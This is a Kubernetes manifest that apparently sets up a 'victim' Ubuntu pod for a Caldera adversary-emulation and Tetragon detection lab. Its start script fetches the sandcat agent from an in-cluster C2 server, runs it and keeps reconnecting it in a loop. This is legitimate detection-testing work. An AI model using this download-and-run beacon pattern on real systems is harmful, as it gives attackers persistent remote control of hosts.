# ── Caldera victim pod ────────────────────────────────────────────────────
# Ubuntu container that downloads and runs the sandcat agent at startup.
# Agent beacons back to the internal Caldera service and joins group "red".
# Tetragon will detect the shell, curl, and agent process execution.
apiVersion: v1
kind: ConfigMap
metadata:
  name: caldera-victim-script
  namespace: piap
data:
  start.sh: |
    #!/bin/bash

    echo "[victim] Installing tools..."
    apt-get update -qq && apt-get install -y -qq curl wget iputils-ping netcat-openbsd file 2>/dev/null || true

    echo "[victim] Waiting for Caldera C2 to be ready..."
    until curl -sf --max-time 3 http://caldera.piap.svc.cluster.local:8888 > /dev/null 2>&1; do
      echo "[victim] Caldera not ready, retrying in 15s..."
      sleep 15
    done

    echo "[victim] Caldera is up — waiting for sandcat agent binary to be compiled..."
    while true; do
      curl -s -X POST \
        -H "file:sandcat.go-linux" \
        -H "platform:linux" \
        http://caldera.piap.svc.cluster.local:8888/file/download \
        -o /tmp/sandcat

      # Verify we got a real ELF binary (not an error page)
      if [ -s /tmp/sandcat ] && file /tmp/sandcat | grep -q "ELF"; then
        echo "[victim] Agent binary downloaded successfully."
        break
      else
        echo "[victim] Agent binary not ready yet, retrying in 10s..."
        rm -f /tmp/sandcat
        sleep 10
      fi
    done

    chmod +x /tmp/sandcat

    # Run the agent in a loop — if it exits (C2 disconnect, task complete, etc.)
    # wait and reconnect rather than letting the container exit and trigger a
    # Kubernetes restart (which causes CrashLoopBackOff).
    while true; do
      echo "[victim] Connecting to C2 (group: red)..."
      /tmp/sandcat -server http://caldera.piap.svc.cluster.local:8888 -group red -v || true
      echo "[victim] Agent exited. Reconnecting in 30s..."
      sleep 30
    done
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: caldera-victim
  namespace: piap
  labels:
    app: caldera-victim
    io.kompose.service: caldera-victim
spec:
  replicas: 1
  selector:
    matchLabels:
      app: caldera-victim
  strategy:
    type: Recreate
  template:
    metadata:
      labels:
        app: caldera-victim
        io.kompose.service: caldera-victim
    spec:
      containers:
        - name: victim
          image: ubuntu:22.04
          command: ["/bin/bash", "/scripts/start.sh"]
          volumeMounts:
            - name: victim-script
              mountPath: /scripts
          resources:
            requests:
              memory: "128Mi"
              cpu: "50m"
            limits:
              memory: "512Mi"
              cpu: "250m"
      restartPolicy: Always
      volumes:
        - name: victim-script
          configMap:
            name: caldera-victim-script
            defaultMode: 0755
